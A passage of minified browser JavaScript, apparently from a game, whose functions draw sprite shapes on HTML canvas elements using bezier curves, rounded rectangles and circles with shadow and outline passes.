      n.bezierCurveTo(e * 355.0113830566406, e * 467.2216033935547, e * 354.0113830566406, e * 469.2216033935547, e * 336.0113830566406, e * 475.2216033935547);
      n.bezierCurveTo(e * 326.0113830566406, e * 478.2216033935547, e * 326.0113830566406, e * 478.2216033935547, e * 316.0113830566406, e * 481.2216033935547);
      n.bezierCurveTo(e * 304.0113830566406, e * 484.2216033935547, e * 304.0113830566406, e * 477.2216033935547, e * 301.0113830566406, e * 454.2216033935547);
      n.bezierCurveTo(e * 295.5113830566406, e * 429.2216033935547, e * 295.5113830566406, e * 429.2216033935547, e * 290.0113830566406, e * 404.2216033935547);
      n.bezierCurveTo(e * 287.0113830566406, e * 396.2216033935547, e * 297.0113830566406, e * 394.2216033935547, e * 303.0113830566406, e * 392.2216033935547);
      n.bezierCurveTo(e * 316.0113830566406, e * 387.2216033935547, e * 318.0113830566406, e * 387.2216033935547, e * 323.0113830566406, e * 394.2216033935547);
      n.closePath();
      ye(n, t[0], t[0], e * 12);
      n.globalAlpha = 1;
      n.translate(0, e * -5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 323.0113830566406, e * 393.2216033935547);
      n.bezierCurveTo(e * 338.0113830566406, e * 424.7216033935547, e * 338.0113830566406, e * 424.7216033935547, e * 353.0113830566406, e * 456.2216033935547);
      n.bezierCurveTo(e * 355.0113830566406, e * 467.2216033935547, e * 354.0113830566406, e * 469.2216033935547, e * 336.0113830566406, e * 475.2216033935547);
      n.bezierCurveTo(e * 326.0113830566406, e * 478.2216033935547, e * 326.0113830566406, e * 478.2216033935547, e * 316.0113830566406, e * 481.2216033935547);
      n.bezierCurveTo(e * 304.0113830566406, e * 484.2216033935547, e * 304.0113830566406, e * 477.2216033935547, e * 301.0113830566406, e * 454.2216033935547);
      n.bezierCurveTo(e * 295.5113830566406, e * 429.2216033935547, e * 295.5113830566406, e * 429.2216033935547, e * 290.0113830566406, e * 404.2216033935547);
      n.bezierCurveTo(e * 287.0113830566406, e * 396.2216033935547, e * 297.0113830566406, e * 394.2216033935547, e * 303.0113830566406, e * 392.2216033935547);
      n.bezierCurveTo(e * 316.0113830566406, e * 387.2216033935547, e * 318.0113830566406, e * 387.2216033935547, e * 323.0113830566406, e * 394.2216033935547);
      n.closePath();
      ye(n, t[4], t[2], e * 12);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(0, e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 270.0113830566406, e * 413.2216033935547);
      n.bezierCurveTo(e * 271.0113830566406, e * 445.7216033935547, e * 271.0113830566406, e * 445.7216033935547, e * 272.0113830566406, e * 478.2216033935547);
      n.bezierCurveTo(e * 273.0113830566406, e * 490.2216033935547, e * 267.0113830566406, e * 493.2216033935547, e * 249.01138305664062, e * 490.2216033935547);
      n.bezierCurveTo(e * 222.01138305664062, e * 492.2216033935547, e * 220.01138305664062, e * 485.2216033935547, e * 225.01138305664062, e * 467.2216033935547);
      n.bezierCurveTo(e * 230.51138305664062, e * 440.2216033935547, e * 230.51138305664062, e * 440.2216033935547, e * 236.01138305664062, e * 413.2216033935547);
      n.bezierCurveTo(e * 237.01138305664062, e * 405.2216033935547, e * 238.01138305664062, e * 404.2216033935547, e * 253.01138305664062, e * 403.2216033935547);
      n.bezierCurveTo(e * 269.0113830566406, e * 405.2216033935547, e * 270.0113830566406, e * 407.2216033935547, e * 269.0113830566406, e * 412.2216033935547);
      n.closePath();
      ye(n, t[0], t[0], e * 12);
      n.globalAlpha = 1;
      n.translate(0, e * -5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 270.0113830566406, e * 413.2216033935547);
      n.bezierCurveTo(e * 271.0113830566406, e * 445.7216033935547, e * 271.0113830566406, e * 445.7216033935547, e * 272.0113830566406, e * 478.2216033935547);
      n.bezierCurveTo(e * 273.0113830566406, e * 490.2216033935547, e * 267.0113830566406, e * 493.2216033935547, e * 249.01138305664062, e * 490.2216033935547);
      n.bezierCurveTo(e * 222.01138305664062, e * 492.2216033935547, e * 220.01138305664062, e * 485.2216033935547, e * 225.01138305664062, e * 467.2216033935547);
      n.bezierCurveTo(e * 230.51138305664062, e * 440.2216033935547, e * 230.51138305664062, e * 440.2216033935547, e * 236.01138305664062, e * 413.2216033935547);
      n.bezierCurveTo(e * 237.01138305664062, e * 405.2216033935547, e * 238.01138305664062, e * 404.2216033935547, e * 253.01138305664062, e * 403.2216033935547);
      n.bezierCurveTo(e * 269.0113830566406, e * 405.2216033935547, e * 270.0113830566406, e * 407.2216033935547, e * 269.0113830566406, e * 412.2216033935547);
      n.closePath();
      ye(n, t[4], t[2], e * 12);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(0, e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 207.01138305664062, e * 406.2216033935547);
      n.bezierCurveTo(e * 197.51138305664062, e * 440.7216033935547, e * 197.51138305664062, e * 440.7216033935547, e * 188.01138305664062, e * 475.2216033935547);
      n.bezierCurveTo(e * 184.01138305664062, e * 485.2216033935547, e * 179.01138305664062, e * 491.2216033935547, e * 152.01138305664062, e * 477.2216033935547);
      n.bezierCurveTo(e * 136.51138305664062, e * 469.7216033935547, e * 136.51138305664062, e * 469.7216033935547, e * 121.01138305664062, e * 462.2216033935547);
      n.bezierCurveTo(e * 109.01138305664062, e * 453.2216033935547, e * 117.01138305664062, e * 447.2216033935547, e * 133.01138305664062, e * 427.2216033935547);
      n.bezierCurveTo(e * 146.51138305664062, e * 406.7216033935547, e * 146.51138305664062, e * 406.7216033935547, e * 160.01138305664062, e * 386.2216033935547);
      n.bezierCurveTo(e * 163.01138305664062, e * 377.2216033935547, e * 168.01138305664062, e * 378.2216033935547, e * 187.01138305664062, e * 387.2216033935547);
      n.bezierCurveTo(e * 206.01138305664062, e * 395.2216033935547, e * 208.01138305664062, e * 398.2216033935547, e * 207.01138305664062, e * 405.2216033935547);
      n.closePath();
      ye(n, t[0], t[0], e * 12);
      n.globalAlpha = 1;
      n.translate(0, e * -5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 207.01138305664062, e * 406.2216033935547);
      n.bezierCurveTo(e * 197.51138305664062, e * 440.7216033935547, e * 197.51138305664062, e * 440.7216033935547, e * 188.01138305664062, e * 475.2216033935547);
      n.bezierCurveTo(e * 184.01138305664062, e * 485.2216033935547, e * 179.01138305664062, e * 491.2216033935547, e * 152.01138305664062, e * 477.2216033935547);
      n.bezierCurveTo(e * 136.51138305664062, e * 469.7216033935547, e * 136.51138305664062, e * 469.7216033935547, e * 121.01138305664062, e * 462.2216033935547);
      n.bezierCurveTo(e * 109.01138305664062, e * 453.2216033935547, e * 117.01138305664062, e * 447.2216033935547, e * 133.01138305664062, e * 427.2216033935547);
      n.bezierCurveTo(e * 146.51138305664062, e * 406.7216033935547, e * 146.51138305664062, e * 406.7216033935547, e * 160.01138305664062, e * 386.2216033935547);
      n.bezierCurveTo(e * 163.01138305664062, e * 377.2216033935547, e * 168.01138305664062, e * 378.2216033935547, e * 187.01138305664062, e * 387.2216033935547);
      n.bezierCurveTo(e * 206.01138305664062, e * 395.2216033935547, e * 208.01138305664062, e * 398.2216033935547, e * 207.01138305664062, e * 405.2216033935547);
      n.closePath();
      ye(n, t[3], t[2], e * 12);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(0, e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 130.01138305664062, e * 375.2216033935547);
      n.bezierCurveTo(e * 109.51138305664062, e * 400.7216033935547, e * 109.51138305664062, e * 400.7216033935547, e * 89.01138305664062, e * 426.2216033935547);
      n.bezierCurveTo(e * 82.01138305664062, e * 435.2216033935547, e * 77.01138305664062, e * 435.2216033935547, e * 62.011383056640625, e * 417.2216033935547);
      n.bezierCurveTo(e * 43.011383056640625, e * 397.2216033935547, e * 47.011383056640625, e * 395.2216033935547, e * 62.011383056640625, e * 382.2216033935547);
      n.bezierCurveTo(e * 84.01138305664062, e * 366.7216033935547, e * 84.01138305664062, e * 366.7216033935547, e * 106.01138305664062, e * 351.2216033935547);
      n.bezierCurveTo(e * 116.01138305664062, e * 344.2216033935547, e * 120.01138305664062, e * 347.2216033935547, e * 127.01138305664062, e * 356.2216033935547);
      n.bezierCurveTo(e * 137.01138305664062, e * 366.2216033935547, e * 137.01138305664062, e * 366.2216033935547, e * 131.01138305664062, e * 376.2216033935547);
      n.closePath();
      ye(n, t[0], t[0], e * 12);
      n.globalAlpha = 1;
      n.translate(0, e * -5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 130.01138305664062, e * 375.2216033935547);
      n.bezierCurveTo(e * 109.51138305664062, e * 400.7216033935547, e * 109.51138305664062, e * 400.7216033935547, e * 89.01138305664062, e * 426.2216033935547);
      n.bezierCurveTo(e * 82.01138305664062, e * 435.2216033935547, e * 77.01138305664062, e * 435.2216033935547, e * 62.011383056640625, e * 417.2216033935547);
      n.bezierCurveTo(e * 43.011383056640625, e * 397.2216033935547, e * 47.011383056640625, e * 395.2216033935547, e * 62.011383056640625, e * 382.2216033935547);
      n.bezierCurveTo(e * 84.01138305664062, e * 366.7216033935547, e * 84.01138305664062, e * 366.7216033935547, e * 106.01138305664062, e * 351.2216033935547);
      n.bezierCurveTo(e * 116.01138305664062, e * 344.2216033935547, e * 120.01138305664062, e * 347.2216033935547, e * 127.01138305664062, e * 356.2216033935547);
      n.bezierCurveTo(e * 137.01138305664062, e * 366.2216033935547, e * 137.01138305664062, e * 366.2216033935547, e * 131.01138305664062, e * 376.2216033935547);
      n.closePath();
      ye(n, t[4], t[2], e * 12);
      return r;
    }
    function Jr(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 218;
      r.height = e * 185;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 64, e * 53.135406494140625);
      n.bezierCurveTo(e * 92, e * 17.135406494140625, e * 116, e * 11.135406494140625, e * 158, e * 53.135406494140625);
      n.bezierCurveTo(e * 178, e * 74.13540649414062, e * 181, e * 81.13540649414062, e * 196, e * 101.13540649414062);
      n.bezierCurveTo(e * 214, e * 127.13540649414062, e * 192, e * 138.13540649414062, e * 173, e * 149.13540649414062);
      n.bezierCurveTo(e * 137, e * 166.13540649414062, e * 74, e * 170.13540649414062, e * 36, e * 141.13540649414062);
      n.bezierCurveTo(e * 13, e * 127.13540649414062, e * 20, e * 119.13540649414062, e * 30, e * 103.13540649414062);
      n.bezierCurveTo(e * 48, e * 71.13540649414062, e * 54, e * 67.13540649414062, e * 63, e * 54.135406494140625);
      n.closePath();
      ye(n, t[0], t[1], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 107, e * 25.135406494140625);
      n.bezierCurveTo(e * 62, e * 90.13540649414062, e * 54, e * 129.13540649414062, e * 53, e * 151.13540649414062);
      n.bezierCurveTo(e * 39.5, e * 142.13540649414062, e * 39.5, e * 142.13540649414062, e * 26, e * 133.13540649414062);
      n.bezierCurveTo(e * 23.5, e * 128.63540649414062, e * 23.5, e * 128.63540649414062, e * 21, e * 124.13540649414062);
      n.bezierCurveTo(e * 22, e * 113.13540649414062, e * 31, e * 99.13540649414062, e * 40, e * 88.13540649414062);
      n.bezierCurveTo(e * 54.5, e * 67.13540649414062, e * 54.5, e * 67.13540649414062, e * 69, e * 46.135406494140625);
      n.bezierCurveTo(e * 80.5, e * 36.635406494140625, e * 80.5, e * 36.635406494140625, e * 92, e * 27.135406494140625);
      n.closePath();
      ye(n, t[1]);
      return r;
    }
    function Xr(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 167;
      r.height = e * 136;
      n.globalAlpha = 0.5;
      n.save();
      n.translate(e * 76.71426391601562, e * 67.85713195800781);
      Be(n, e * -57.5, e * -54.5, e * 115, e * 109, e * 15);
      n.restore();
      ye(n, t[0]);
      n.globalAlpha = 0.8;
      n.save();
      n.translate(e * 76.71426391601562, e * 67.85713195800781);
      Be(n, e * -57.5, e * -54.5, e * 115, e * 109, e * 15);
      n.restore();
      ye(n, undefined, t[1], e * 7);
      n.globalAlpha = 0.5;
      n.save();
      n.translate(e * 91.21426391601562, e * 67.35713195800781);
      Be(n, e * -56, e * -55, e * 115, e * 109, e * 15);
      n.restore();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.save();
      n.translate(e * 91.21426391601562, e * 67.35713195800781);
      Be(n, e * -56, e * -55, e * 115, e * 109, e * 15);
      n.restore();
      ye(n, undefined, t[1], e * 7);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 131.21426391601562, e * 70.35713195800781);
      n.bezierCurveTo(e * 133.21426391601562, e * 95.35713195800781, e * 128.21426391601562, e * 109.35713195800781, e * 108.21426391601562, e * 108.35713195800781);
      ye(n, undefined, t[1], e * 10);
      return r;
    }
    function qr(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 163;
      r.height = e * 163;
      n.save();
      n.translate(e * 82.5, e * 81.1015625);
      n.rotate(0);
      Be(n, e * -65.5, e * -66, e * 131, e * 131, e * 5);
      n.restore();
      ye(n, t[1]);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(e * 5, e * 5);
      n.save();
      n.translate(e * 80, e * 17.1015625);
      Be(n, e * -64, e * -4.5, e * 129, e * 9, e * 5);
      n.restore();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(e * -5, e * -5);
      n.save();
      n.translate(e * 80, e * 17.1015625);
      Be(n, e * -64, e * -4.5, e * 129, e * 9, e * 5);
      n.restore();
      ye(n, t[2], t[3], e * 3);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(e * 5, e * 5);
      n.save();
      n.translate(e * 145.5, e * 83.6015625);
      Be(n, e * -4.5, e * -61, e * 9, e * 129, e * 5);
      n.restore();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(e * -5, e * -5);
      n.save();
      n.translate(e * 145.5, e * 83.6015625);
      Be(n, e * -4.5, e * -61, e * 9, e * 129, e * 5);
      n.restore();
      ye(n, t[2], t[3], e * 3);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(e * 5, e * 5);
      n.save();
      n.translate(e * 17.5, e * 82.6015625);
      Be(n, e * -4.5, e * -65, e * 9, e * 129, e * 5);
      n.restore();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(e * -5, e * -5);
      n.save();
      n.translate(e * 17.5, e * 82.6015625);
      Be(n, e * -4.5, e * -65, e * 9, e * 129, e * 5);
      n.restore();
      ye(n, t[2], t[3], e * 3);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(e * 5, e * 5);
      n.save();
      n.translate(e * 80.5, e * 145.6015625);
      Be(n, e * -65.5, e * -4, e * 129, e * 9, e * 5);
      n.restore();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(e * -5, e * -5);
      n.save();
      n.translate(e * 80.5, e * 145.6015625);
      Be(n, e * -65.5, e * -4, e * 129, e * 9, e * 5);
      n.restore();
      ye(n, t[2], t[3], e * 3);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(e * 5, e * 5);
      n.save();
      n.translate(e * 17, e * 18.1015625);
      Be(n, e * -11, e * -11.5, e * 22, e * 22, e * 5);
      n.restore();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(e * -5, e * -5);
      n.save();
      n.translate(e * 17, e * 18.1015625);
      Be(n, e * -11, e * -11.5, e * 22, e * 22, e * 5);
      n.restore();
      ye(n, t[2], t[3], e * 3);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(e * 5, e * 5);
      n.save();
      n.translate(e * 145.5, e * 16.6015625);
      Be(n, e * -10.5, e * -11.5, e * 21, e * 22, e * 5);
      n.restore();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(e * -5, e * -5);
      n.save();
      n.translate(e * 145.5, e * 16.6015625);
      Be(n, e * -10.5, e * -11.5, e * 21, e * 22, e * 5);
      n.restore();
      ye(n, t[2], t[3], e * 3);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(e * 5, e * 5);
      n.save();
      n.translate(e * 145.5, e * 144.1015625);
      Be(n, e * -10.5, e * -11, e * 22, e * 22, e * 5);
      n.restore();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(e * -5, e * -5);
      n.save();
      n.translate(e * 145.5, e * 144.1015625);
      Be(n, e * -10.5, e * -11, e * 22, e * 22, e * 5);
      n.restore();
      ye(n, t[2], t[3], e * 3);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(e * 5, e * 5);
      n.save();
      n.translate(e * 17.5, e * 145.1015625);
      Be(n, e * -11.5, e * -12, e * 22, e * 22, e * 5);
      n.restore();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(e * -5, e * -5);
      n.save();
      n.translate(e * 17.5, e * 145.1015625);
      Be(n, e * -11.5, e * -12, e * 22, e * 22, e * 5);
      n.restore();
      ye(n, t[2], t[3], e * 3);
      return r;
    }
    function jr(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 168;
      r.height = e * 100;
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(e * 10, e * 5);
      n.save();
      n.translate(e * 24.5, e * 44.30000305175781);
      Be(n, e * -19.5, e * -8.5, e * 39, e * 17, e * 10);
      n.restore();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 115, e * 37.80000305175781);
      n.bezierCurveTo(e * 142, e * 37.80000305175781, e * 140, e * 37.80000305175781, e * 141, e * 37.80000305175781);
      n.bezierCurveTo(e * 147, e * 28.800003051757812, e * 149, e * 26.800003051757812, e * 153, e * 32.80000305175781);
      n.bezierCurveTo(e * 160, e * 42.80000305175781, e * 157, e * 50.80000305175781, e * 153, e * 58.80000305175781);
      n.bezierCurveTo(e * 148, e * 62.80000305175781, e * 147, e * 59.80000305175781, e * 143, e * 52.80000305175781);
      n.bezierCurveTo(e * 129, e * 52.80000305175781, e * 129, e * 52.80000305175781, e * 115, e * 52.80000305175781);
      n.closePath();
      ye(n, t[0]);
      ze(n, e * 78, e * 44.80000305175781, e * 39.44616584663204);
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(e * -10, e * -5);
      n.save();
      n.translate(e * 24.5, e * 44.30000305175781);
      Be(n, e * -19.5, e * -8.5, e * 39, e * 17, e * 10);
      n.restore();
      ye(n, undefined, t[3], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 115, e * 37.80000305175781);
      n.bezierCurveTo(e * 142, e * 37.80000305175781, e * 140, e * 37.80000305175781, e * 141, e * 37.80000305175781);
      n.bezierCurveTo(e * 147, e * 28.800003051757812, e * 149, e * 26.800003051757812, e * 153, e * 32.80000305175781);
      n.bezierCurveTo(e * 160, e * 42.80000305175781, e * 157, e * 50.80000305175781, e * 153, e * 58.80000305175781);
      n.bezierCurveTo(e * 148, e * 62.80000305175781, e * 147, e * 59.80000305175781, e * 143, e * 52.80000305175781);
      n.bezierCurveTo(e * 129, e * 52.80000305175781, e * 129, e * 52.80000305175781, e * 115, e * 52.80000305175781);
      n.closePath();
      ye(n, undefined, t[3], e * 6);
      ze(n, e * 78, e * 44.80000305175781, e * 42.44616584663204);
      ye(n, undefined, t[3], e * 6);
      n.save();
      n.translate(e * 24.5, e * 44.30000305175781);
      Be(n, e * -19.5, e * -8.5, e * 39, e * 17, e * 10);
      n.restore();
      ye(n, t[1]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 115, e * 37.80000305175781);
      n.bezierCurveTo(e * 142, e * 37.80000305175781, e * 140, e * 37.80000305175781, e * 141, e * 37.80000305175781);
      n.bezierCurveTo(e * 147, e * 28.800003051757812, e * 149, e * 26.800003051757812, e * 153, e * 32.80000305175781);
      n.bezierCurveTo(e * 160, e * 42.80000305175781, e * 157, e * 50.80000305175781, e * 153, e * 58.80000305175781);
      n.bezierCurveTo(e * 148, e * 62.80000305175781, e * 147, e * 59.80000305175781, e * 143, e * 52.80000305175781);
      n.bezierCurveTo(e * 129, e * 52.80000305175781, e * 129, e * 52.80000305175781, e * 115, e * 52.80000305175781);
      n.closePath();
      ye(n, t[1]);
      ze(n, e * 78, e * 44.80000305175781, e * 39.44616584663204);
      ye(n, t[2], t[1], e * 4);
      ze(n, e * 78, e * 44.80000305175781, e * 29.68164415931166);
      ye(n, t[3], t[1], e * 4);
      ze(n, e * 78, e * 44, e * 20);
      ye(n, t[4]);
      return r;
    }
    function Zr(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 158;
      r.height = e * 201;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 96.5, e * 76.421875);
      n.bezierCurveTo(e * 100.5, e * 64.421875, e * 103.5, e * 62.421875, e * 110.5, e * 65.421875);
      n.bezierCurveTo(e * 116.5, e * 66.421875, e * 117.5, e * 67.421875, e * 112.5, e * 73.421875);
      n.bezierCurveTo(e * 107, e * 79.921875, e * 107, e * 79.921875, e * 101.5, e * 86.421875);
      n.closePath();
      ye(n, t[8], t[8], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 61.5, e * 78.421875);
      n.bezierCurveTo(e * 57.5, e * 73.421875, e * 51.5, e * 66.421875, e * 45.5, e * 68.421875);
      n.bezierCurveTo(e * 32.5, e * 73.421875, e * 38.5, e * 75.421875, e * 46.5, e * 81.421875);
      n.bezierCurveTo(e * 51.5, e * 84.921875, e * 51.5, e * 84.921875, e * 56.5, e * 88.421875);
      n.closePath();
      ye(n, t[8], t[8], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 116.5, e * 127.421875);
      n.bezierCurveTo(e * 124.5, e * 108.421875, e * 129.5, e * 104.421875, e * 141.5, e * 107.421875);
      n.bezierCurveTo(e * 156.5, e * 112.421875, e * 153.5, e * 113.421875, e * 132.5, e * 134.421875);
      n.bezierCurveTo(e * 123.5, e * 141.921875, e * 123.5, e * 141.921875, e * 114.5, e * 149.421875);
      n.closePath();
      ye(n, t[8], t[8], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 41.5, e * 134.421875);
      n.bezierCurveTo(e * 30.5, e * 119.421875, e * 25.5, e * 111.421875, e * 12.5, e * 115.421875);
      n.bezierCurveTo(e * 4.5, e * 120.421875, e * 4.5, e * 121.421875, e * 26.5, e * 142.421875);
      n.bezierCurveTo(e * 35, e * 149.921875, e * 35, e * 149.921875, e * 43.5, e * 157.421875);
      n.closePath();
      ye(n, t[8], t[8], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 78.5, e * 51.921875);
      n.bezierCurveTo(e * 99.5, e * 75.921875, e * 110.5, e * 96.921875, e * 118.5, e * 120.921875);
      n.bezierCurveTo(e * 121.5, e * 140.921875, e * 107.5, e * 179.921875, e * 75.5, e * 183.921875);
      n.bezierCurveTo(e * 30.5, e * 169.921875, e * 37.5, e * 131.921875, e * 34.5, e * 120.921875);
      n.bezierCurveTo(e * 41.5, e * 89.921875, e * 61.5, e * 67.921875, e * 78.5, e * 51.921875);
      n.closePath();
      ye(n, t[8], t[8], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 72.5, e * 72.421875);
      n.bezierCurveTo(e * 76.5, e * 79.421875, e * 79.5, e * 80.421875, e * 83.5, e * 73.421875);
      n.bezierCurveTo(e * 80.5, e * 96.921875, e * 79.5, e * 114.421875, e * 77.5, e * 120.421875);
      n.closePath();
      ye(n, t[8], t[8], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 42.5, e * 163.421875);
      n.bezierCurveTo(e * 62.5, e * 185.421875, e * 86.5, e * 186.421875, e * 111.5, e * 165.421875);
      n.bezierCurveTo(e * 107.5, e * 176.421875, e * 95.5, e * 187.421875, e * 75.5, e * 188.421875);
      n.bezierCurveTo(e * 53.5, e * 188.421875, e * 43.5, e * 171.421875, e * 42.5, e * 164.421875);
      n.closePath();
      ye(n, t[8], t[8], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 79.5, e * 61.421875);
      n.bezierCurveTo(e * 88.5, e * 31.421875, e * 81.5, e * 16.421875, e * 75.5, e * 7.421875);
      n.bezierCurveTo(e * 77.5, e * 28.421875, e * 77.5, e * 37.421875, e * 68.5, e * 42.421875);
      n.bezierCurveTo(e * 79.5, e * 57.421875, e * 79.5, e * 58.421875, e * 80.5, e * 61.421875);
      n.closePath();
      ye(n, t[8], t[8], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 72.5, e * 72.421875);
      n.bezierCurveTo(e * 76.5, e * 79.421875, e * 79.5, e * 80.421875, e * 83.5, e * 73.421875);
      n.bezierCurveTo(e * 80.5, e * 96.921875, e * 79.5, e * 114.421875, e * 77.5, e * 120.421875);
      n.closePath();
      ye(n, t[8], t[8], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 96.5, e * 76.421875);
      n.bezierCurveTo(e * 100.5, e * 64.421875, e * 103.5, e * 62.421875, e * 110.5, e * 65.421875);
      n.bezierCurveTo(e * 116.5, e * 66.421875, e * 117.5, e * 67.421875, e * 112.5, e * 73.421875);
      n.bezierCurveTo(e * 107, e * 79.921875, e * 107, e * 79.921875, e * 101.5, e * 86.421875);
      n.closePath();
      ye(n, t[1], t[2], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 61.5, e * 78.421875);
      n.bezierCurveTo(e * 57.5, e * 73.421875, e * 51.5, e * 66.421875, e * 45.5, e * 68.421875);
      n.bezierCurveTo(e * 32.5, e * 73.421875, e * 38.5, e * 75.421875, e * 46.5, e * 81.421875);
      n.bezierCurveTo(e * 51.5, e * 84.921875, e * 51.5, e * 84.921875, e * 56.5, e * 88.421875);
      n.closePath();
      ye(n, t[1], t[2], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 116.5, e * 127.421875);
      n.bezierCurveTo(e * 124.5, e * 108.421875, e * 129.5, e * 104.421875, e * 141.5, e * 107.421875);
      n.bezierCurveTo(e * 156.5, e * 112.421875, e * 153.5, e * 113.421875, e * 132.5, e * 134.421875);
      n.bezierCurveTo(e * 123.5, e * 141.921875, e * 123.5, e * 141.921875, e * 114.5, e * 149.421875);
      n.closePath();
      ye(n, t[1], t[2], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 41.5, e * 134.421875);
      n.bezierCurveTo(e * 30.5, e * 119.421875, e * 25.5, e * 111.421875, e * 12.5, e * 115.421875);
      n.bezierCurveTo(e * 4.5, e * 120.421875, e * 4.5, e * 121.421875, e * 26.5, e * 142.421875);
      n.bezierCurveTo(e * 35, e * 149.921875, e * 35, e * 149.921875, e * 43.5, e * 157.421875);
      n.closePath();
      ye(n, t[1], t[2], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 78.5, e * 51.921875);
      n.bezierCurveTo(e * 99.5, e * 75.921875, e * 110.5, e * 96.921875, e * 118.5, e * 120.921875);
      n.bezierCurveTo(e * 121.5, e * 140.921875, e * 107.5, e * 179.921875, e * 75.5, e * 183.921875);
      n.bezierCurveTo(e * 30.5, e * 169.921875, e * 37.5, e * 131.921875, e * 34.5, e * 120.921875);
      n.bezierCurveTo(e * 41.5, e * 89.921875, e * 61.5, e * 67.921875, e * 78.5, e * 51.921875);
      n.closePath();
      ye(n, t[3], t[2], e * 4);
      ze(n, e * 108.5, e * 148.421875, e * 9);
      ye(n, t[5]);
      ze(n, e * 106.5, e * 144.421875, e * 3);
      ye(n, t[6]);
      ze(n, e * 46.5, e * 148.421875, e * 9);
      ye(n, t[5]);
      ze(n, e * 44.5, e * 144.421875, e * 3);
      ye(n, t[6]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 116.5, e * 114.421875);
      n.bezierCurveTo(e * 121.5, e * 137.421875, e * 118.5, e * 133.421875, e * 108.5, e * 139.421875);
      n.bezierCurveTo(e * 94.5, e * 146.421875, e * 96.5, e * 148.421875, e * 95.5, e * 152.421875);
      ye(n, t[3], t[2], e * 4);
      n.beginPath();
      n.translate(0, e * -2);
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 35.5, e * 131.421875);
      n.bezierCurveTo(e * 36.5, e * 140.421875, e * 39.5, e * 140.421875, e * 49.5, e * 143.421875);
      n.bezierCurveTo(e * 59.5, e * 149.421875, e * 57.5, e * 151.421875, e * 59.5, e * 155.421875);
      ye(n, t[3], t[2], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 84.5, e * 57.421875);
      n.bezierCurveTo(e * 101.5, e * 120.421875, e * 92.5, e * 127.421875, e * 78.5, e * 134.421875);
      n.bezierCurveTo(e * 51.5, e * 131.421875, e * 63.5, e * 102.421875, e * 70.5, e * 59.421875);
      n.bezierCurveTo(e * 75, e * 55.421875, e * 78.5, e * 52.421875, e * 79.5, e * 51.421875);
      n.closePath();
